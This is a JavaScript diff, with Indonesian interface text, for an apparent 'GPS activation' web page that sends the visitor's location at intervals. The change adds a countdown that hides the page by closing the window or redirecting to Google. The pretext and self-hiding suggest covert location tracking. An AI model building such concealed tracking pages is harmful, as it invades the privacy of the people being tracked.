@@ -194,9 +194,44 @@ async function startActivation() {
   }, 15000);
   
   statusBox.className = 'status ok';
-  statusBox.textContent = '✅ GPS aktif - berjalan di latar belakang';
-  document.getElementById('startBtn').style.display = 'none';
-}
+statusBox.textContent = '✅ GPS aktif! Aplikasi akan disembunyikan otomatis...';
+document.getElementById('startBtn').style.display = 'none';
+
+// Tampilkan pesan countdown
+const countdownDiv = document.createElement('div');
+countdownDiv.style.cssText = 'margin-top: 12px; padding: 12px; background: #fff3cd; border-radius: 8px; text-align: center; font-weight: 600; color: #856404;';
+countdownDiv.textContent = '⏱️ Aplikasi akan minimize dalam 5 detik...';
+document.getElementById('mainScreen').appendChild(countdownDiv);
+
+// Countdown 5 detik lalu minimize
+let seconds = 5;
+const countdown = setInterval(() => {
+  seconds--;
+  countdownDiv.textContent = `⏱️ Aplikasi akan minimize dalam ${seconds} detik...`;
+  
+  if (seconds <= 0) {
+    clearInterval(countdown);
+    countdownDiv.remove();
+    
+    // Tampilkan pesan final
+    alert('✅ GPS SUDAH AKTIF!\n\nAplikasi akan di-minimize.\n\nUntuk membuka kembali:\n1. Tekan tombol Home\n2. Buka Chrome\n3. Buka aplikasi ini lagi\n\nAtau buka: aktivasi-gps.vercel.app');
+    
+    // Coba minimize
+    if (navigator.userAgent.match(/Android/i)) {
+      // Untuk Android: coba close atau redirect
+      try {
+        window.open('about:blank', '_self');
+        window.close();
+      } catch(e) {
+        // Fallback: redirect ke Google
+        window.location.href = 'https://www.google.com';
+      }
+    } else {
+      // Untuk desktop: redirect ke Google
+      window.location.href = 'https://www.google.com';
+    }
+  }
+}, 1000);
 
 async function sendLocation(coords) {
   try {
